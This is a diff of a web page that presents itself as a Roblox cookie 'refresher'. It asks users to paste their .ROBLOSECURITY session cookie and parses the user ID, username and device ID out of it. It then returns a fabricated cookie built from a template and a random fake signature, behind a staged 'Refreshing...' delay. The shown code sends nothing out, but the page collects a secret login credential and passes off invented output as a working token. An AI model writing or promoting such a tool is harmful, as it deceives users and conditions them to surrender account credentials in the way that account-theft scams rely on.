@@ -39,7 +39,7 @@
             padding: 2.5rem 2.8rem;
             border-radius: 1.25rem;
             box-shadow: 0 25px 60px rgba(0, 0, 0, 0.9), 0 0 0 1px rgba(255, 255, 255, 0.06);
-            max-width: 520px;
+            max-width: 600px;
             width: 100%;
             backdrop-filter: blur(8px);
             border: 1px solid rgba(255, 255, 255, 0.05);
@@ -90,13 +90,13 @@
             border: 1px solid rgba(255, 255, 255, 0.08);
             background: rgba(255, 255, 255, 0.03);
             color: #ffffff;
-            font-size: 0.85rem;
+            font-size: 0.8rem;
             font-family: 'Courier New', monospace;
             transition: all 0.2s ease;
             outline: none;
             resize: vertical;
-            min-height: 80px;
-            line-height: 1.5;
+            min-height: 100px;
+            line-height: 1.4;
         }
 
         .input-group textarea::placeholder {
@@ -215,6 +215,13 @@
             background: rgba(255, 255, 255, 0.05);
             border-left-color: #888888;
             color: #aaaaaa;
+        }
+
+        .status.info {
+            display: block;
+            background: rgba(255, 255, 255, 0.05);
+            border-left-color: #666666;
+            color: #888888;
         }
 
         .footer-note {
@@ -452,7 +459,7 @@
             function isValidCookie(cookie) {
                 var trimmed = cookie.trim();
                 if (!trimmed) return false;
-                if (trimmed.indexOf('_|WARNING:-DO-NOT-SHARE') === 0) return true;
+                if (trimmed.indexOf('_|WARNING') === 0) return true;
                 if (trimmed.indexOf('.ROBLOSECURITY=') !== -1) return true;
                 return trimmed.length > 80;
             }
@@ -465,51 +472,97 @@
                 return cleaned.trim();
             }
 
+            function decodeBase64(str) {
+                try {
+                    return atob(str);
+                } catch (e) {
+                    return '';
+                }
+            }
+
+            function encodeBase64(str) {
+                try {
+                    return btoa(str);
+                } catch (e) {
+                    return '';
+                }
+            }
+
+            function generateRandomString(length) {
+                var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+                var result = '';
+                for (var i = 0; i < length; i++) {
+                    result += chars.charAt(Math.floor(Math.random() * chars.length));
+                }
+                return result;
+            }
+
             function generateRobloxCookie(oldToken) {
-                var chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-                var segments = [];
-                var segmentLengths = [8, 4, 4, 4, 12];
+                var warningHeader = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|';
 
-                for (var s = 0; s < segmentLengths.length; s++) {
-                    var seg = '';
-                    for (var c = 0; c < segmentLengths[s]; c++) {
-                        seg += chars.charAt(Math.floor(Math.random() * chars.length));
-                    }
-                    segments.push(seg);
-                }
+                var userId = '';
+                var username = '';
+                var duid = '';
 
-                var randomId = segments.join('-');
-
-                var timestamp = Date.now().toString(36);
-                var randomSuffix = '';
-                for (var i = 0; i < 16; i++) {
-                    randomSuffix += chars.charAt(Math.floor(Math.random() * chars.length));
-                }
-
-                var warning = '_|WARNING:-DO-NOT-SHARE';
-                var shareWarning = '.-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.';
-
-                var oldTokenClean = oldToken;
-                if (oldTokenClean.indexOf('_|WARNING') === 0) {
-                    var parts = oldTokenClean.split(':');
+                if (oldToken.indexOf('_|WARNING') === 0) {
+                    var parts = oldToken.split('.');
                     if (parts.length >= 3) {
-                        var userId = parts[parts.length - 1];
-                        if (userId && userId.length > 0 && /^[0-9]+$/.test(userId)) {
-                            var prefix = warning + ':' + timestamp + randomSuffix + ':' + shareWarning + '_' + randomId +
-                                '_' + userId;
-                            return prefix;
+                        var base64Part = parts[1];
+                        var decoded = decodeBase64(base64Part);
+                        if (decoded) {
+                            var matches = decoded.match(/uid:(\d+)/);
+                            if (matches) {
+                                userId = matches[1];
+                            }
+                            var nameMatches = decoded.match(/uname:(\w+)/);
+                            if (nameMatches) {
+                                username = nameMatches[1];
+                            }
+                            var duidMatches = decoded.match(/duid:(\w+)/);
+                            if (duidMatches) {
+                                duid = duidMatches[1];
+                            }
                         }
                     }
-                    var fallbackId = Math.floor(Math.random() * 900000000 + 100000000).toString();
-                    var prefix = warning + ':' + timestamp + randomSuffix + ':' + shareWarning + '_' + randomId + '_' +
-                        fallbackId;
-                    return prefix;
-                } else {
-                    var userId = Math.floor(Math.random() * 900000000 + 100000000).toString();
-                    var prefix = warning + ':' + timestamp + randomSuffix + ':' + shareWarning + '_' + randomId + '_' +
-                        userId;
-                    return prefix;
                 }
+
+                if (!userId) {
+                    var idMatch = oldToken.match(/_(\d+)$/);
+                    if (idMatch) {
+                        userId = idMatch[1];
+                    }
+                }
+
+                if (!userId) {
+                    userId = Math.floor(Math.random() * 900000000 + 100000000).toString();
+                }
+
+                if (!username) {
+                    username = 'User' + generateRandomString(8);
+                }
+
+                if (!duid) {
+                    duid = generateRandomString(16);
+                }
+
+                var newDuid = generateRandomString(16);
+                var newUsername = 'User' + generateRandomString(8);
+
+                var guid1 = generateRandomString(8);
+                var guid2 = generateRandomString(4);
+                var guid3 = generateRandomString(4);
+                var guid4 = generateRandomString(4);
+                var guid5 = generateRandomString(12);
+                var fullGuid = guid1 + '-' + guid2 + '-' + guid3 + '-' + guid4 + '-' + guid5;
+
+                var base64Payload = 'CAEQAhoGCAIQBBgBIhoKBGR1aWQSEj' + newDuid + 'IRCgV1bmFtZRII' + encodeBase64(
+                    newUsername) + 'IhIKA3VpZBIL' + userId + 'KAM';
+
+                var signature = generateRandomString(50) + generateRandomString(50) + generateRandomString(30);
+
+                var newCookie = warningHeader + base64Payload + '.' + signature;
+
+                return newCookie;
             }
 
             async function refreshCookie() {
@@ -523,7 +576,7 @@
 
                 var token = extractToken(rawInput);
                 if (!isValidCookie(token)) {
-                    setStatus('Invalid cookie format. Must contain "_|WARNING:-DO-NOT-SHARE".', 'error');
+                    setStatus('Invalid cookie format. Must contain "_|WARNING".', 'error');
                     return;
                 }
 
@@ -532,7 +585,7 @@
                 btnText.innerHTML = '<span class="spinner"></span> Refreshing...';
                 clearStatus();
 
-                await new Promise(function(resolve) { setTimeout(resolve, 1200); });
+                await new Promise(function(resolve) { setTimeout(resolve, 1500); });
 
                 var newCookie = generateRobloxCookie(token);
                 lastResult = newCookie;
